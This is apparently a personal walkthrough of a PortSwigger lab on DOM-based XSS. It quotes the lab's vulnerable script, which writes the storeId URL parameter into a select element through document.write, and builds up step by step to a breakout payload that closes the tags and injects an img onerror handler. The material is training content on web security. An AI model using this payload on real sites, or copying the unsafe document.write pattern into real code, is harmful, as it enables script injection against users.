# Lab: DOM XSS in document.write sink using source location.search inside a select element

# https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element

```bash
 # First let's look for scripts. You can also inspect check stock

<script>var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {document.write('<option selected>'+store+'</option>');}
for(var i=0;i<stores.length;i++) {if(stores[i] === store) {
continue;}document.write('<option>'+stores[i]+'</option>');}
document.write('</select>');</script>

# (window.location.search) (everything after the ?)
# document.write function, which writes data out to the page.
```
```bash
# We will try to use location search. This was the url

https://...web-security-academy.net/product?productId=1

# I changed it to this and typed location.search to console.

https://...web-security-academy.net/product?productId=1&x=x

location.search

"?productId=1&x=x"
```

```bash
# var store = (new URLSearchParams(window.location.search)).get('storeId');
# This part of the script gets storeId so let's change x to that.

web-security-academy.net/product?productId=1&storeId=x

# Now we added x to dropdown that contains storeIds.
```
```bash
# <select name="storeId"><option selected="">x</option><option>London</option><option>Paris</option><option>Milan</option></select>
# Let's take x out of option and select.

web-security-academy.net/product?productId=1&storeId=</option></select>x

# <select name="storeId"><option selected=""></option></select> looks like this now
# and x is idle alone.

var store = (new URLSearchParams(window.location.search)).get('storeId');

# store variable now have this value:

 </option></select>x 
```
```bash
 # Now we will use store variable to create dom if(store) { document.write('<option selected>'+store+'</option>');  }

  web-security-academy.net/product?productId=1&storeId=</option></select><img src=1 onerror=alert()>
```


